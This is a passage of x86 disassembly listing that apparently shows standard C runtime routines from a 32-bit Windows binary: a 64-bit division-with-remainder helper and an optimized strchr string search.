  4289ee:	pop    edi
  4289ef:	leave  
  4289f0:	ret    
  4289f1:	int3   
  4289f2:	int3   
  4289f3:	int3   
  4289f4:	int3   
  4289f5:	int3   
  4289f6:	int3   
  4289f7:	int3   
  4289f8:	int3   
  4289f9:	int3   
  4289fa:	int3   
  4289fb:	int3   
  4289fc:	int3   
  4289fd:	int3   
  4289fe:	int3   
  4289ff:	int3   
  428a00:	push   esi
  428a01:	mov    eax,DWORD PTR [esp+0x14]
  428a05:	or     eax,eax
  428a07:	jne    0x428a31
  428a09:	mov    ecx,DWORD PTR [esp+0x10]
  428a0d:	mov    eax,DWORD PTR [esp+0xc]
  428a11:	xor    edx,edx
  428a13:	div    ecx
  428a15:	mov    ebx,eax
  428a17:	mov    eax,DWORD PTR [esp+0x8]
  428a1b:	div    ecx
  428a1d:	mov    esi,eax
  428a1f:	mov    eax,ebx
  428a21:	mul    DWORD PTR [esp+0x10]
  428a25:	mov    ecx,eax
  428a27:	mov    eax,esi
  428a29:	mul    DWORD PTR [esp+0x10]
  428a2d:	add    edx,ecx
  428a2f:	jmp    0x428a78
  428a31:	mov    ecx,eax
  428a33:	mov    ebx,DWORD PTR [esp+0x10]
  428a37:	mov    edx,DWORD PTR [esp+0xc]
  428a3b:	mov    eax,DWORD PTR [esp+0x8]
  428a3f:	shr    ecx,1
  428a41:	rcr    ebx,1
  428a43:	shr    edx,1
  428a45:	rcr    eax,1
  428a47:	or     ecx,ecx
  428a49:	jne    0x428a3f
  428a4b:	div    ebx
  428a4d:	mov    esi,eax
  428a4f:	mul    DWORD PTR [esp+0x14]
  428a53:	mov    ecx,eax
  428a55:	mov    eax,DWORD PTR [esp+0x10]
  428a59:	mul    esi
  428a5b:	add    edx,ecx
  428a5d:	jb     0x428a6d
  428a5f:	cmp    edx,DWORD PTR [esp+0xc]
  428a63:	ja     0x428a6d
  428a65:	jb     0x428a76
  428a67:	cmp    eax,DWORD PTR [esp+0x8]
  428a6b:	jbe    0x428a76
  428a6d:	dec    esi
  428a6e:	sub    eax,DWORD PTR [esp+0x10]
  428a72:	sbb    edx,DWORD PTR [esp+0x14]
  428a76:	xor    ebx,ebx
  428a78:	sub    eax,DWORD PTR [esp+0x8]
  428a7c:	sbb    edx,DWORD PTR [esp+0xc]
  428a80:	neg    edx
  428a82:	neg    eax
  428a84:	sbb    edx,0x0
  428a87:	mov    ecx,edx
  428a89:	mov    edx,ebx
  428a8b:	mov    ebx,ecx
  428a8d:	mov    ecx,eax
  428a8f:	mov    eax,esi
  428a91:	pop    esi
  428a92:	ret    0x10
  428a95:	int3   
  428a96:	int3   
  428a97:	int3   
  428a98:	int3   
  428a99:	int3   
  428a9a:	int3   
  428a9b:	int3   
  428a9c:	int3   
  428a9d:	int3   
  428a9e:	int3   
  428a9f:	int3   
  428aa0:	lea    eax,[edx-0x1]
  428aa3:	pop    ebx
  428aa4:	ret    
  428aa5:	lea    esp,[esp+0x0]
  428aac:	lea    esp,[esp+0x0]
  428ab0:	xor    eax,eax
  428ab2:	mov    al,BYTE PTR [esp+0x8]
  428ab6:	push   ebx
  428ab7:	mov    ebx,eax
  428ab9:	shl    eax,0x8
  428abc:	mov    edx,DWORD PTR [esp+0x8]
  428ac0:	test   edx,0x3
  428ac6:	je     0x428add
  428ac8:	mov    cl,BYTE PTR [edx]
  428aca:	add    edx,0x1
  428acd:	cmp    cl,bl
  428acf:	je     0x428aa0
  428ad1:	test   cl,cl
  428ad3:	je     0x428b26
  428ad5:	test   edx,0x3
  428adb:	jne    0x428ac8
  428add:	or     ebx,eax
  428adf:	push   edi
  428ae0:	mov    eax,ebx
  428ae2:	shl    ebx,0x10
  428ae5:	push   esi
  428ae6:	or     ebx,eax
  428ae8:	mov    ecx,DWORD PTR [edx]
  428aea:	mov    edi,0x7efefeff
  428aef:	mov    eax,ecx
  428af1:	mov    esi,edi
  428af3:	xor    ecx,ebx
  428af5:	add    esi,eax
  428af7:	add    edi,ecx
  428af9:	xor    ecx,0xffffffff
  428afc:	xor    eax,0xffffffff
  428aff:	xor    ecx,edi
  428b01:	xor    eax,esi
  428b03:	add    edx,0x4
  428b06:	and    ecx,0x81010100
  428b0c:	jne    0x428b2a
  428b0e:	and    eax,0x81010100
  428b13:	je     0x428ae8
  428b15:	and    eax,0x1010100
  428b1a:	jne    0x428b24
  428b1c:	and    esi,0x80000000
  428b22:	jne    0x428ae8
  428b24:	pop    esi
  428b25:	pop    edi
  428b26:	pop    ebx
  428b27:	xor    eax,eax
  428b29:	ret    
  428b2a:	mov    eax,DWORD PTR [edx-0x4]
  428b2d:	cmp    al,bl
  428b2f:	je     0x428b67
  428b31:	test   al,al
  428b33:	je     0x428b24
  428b35:	cmp    ah,bl
  428b37:	je     0x428b60
  428b39:	test   ah,ah
  428b3b:	je     0x428b24
  428b3d:	shr    eax,0x10
  428b40:	cmp    al,bl
  428b42:	je     0x428b59
  428b44:	test   al,al
  428b46:	je     0x428b24
  428b48:	cmp    ah,bl
  428b4a:	je     0x428b52
  428b4c:	test   ah,ah
  428b4e:	je     0x428b24
  428b50:	jmp    0x428ae8
  428b52:	pop    esi
  428b53:	pop    edi
  428b54:	lea    eax,[edx-0x1]
  428b57:	pop    ebx
  428b58:	ret    
  428b59:	lea    eax,[edx-0x2]
  428b5c:	pop    esi
  428b5d:	pop    edi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	lea    eax,[edx-0x3]
  428b63:	pop    esi
  428b64:	pop    edi
  428b65:	pop    ebx
  428b66:	ret    
  428b67:	lea    eax,[edx-0x4]
  428b6a:	pop    esi
  428b6b:	pop    edi
  428b6c:	pop    ebx
  428b6d:	ret    
  428b6e:	jmp    DWORD PTR ds:0x42905c
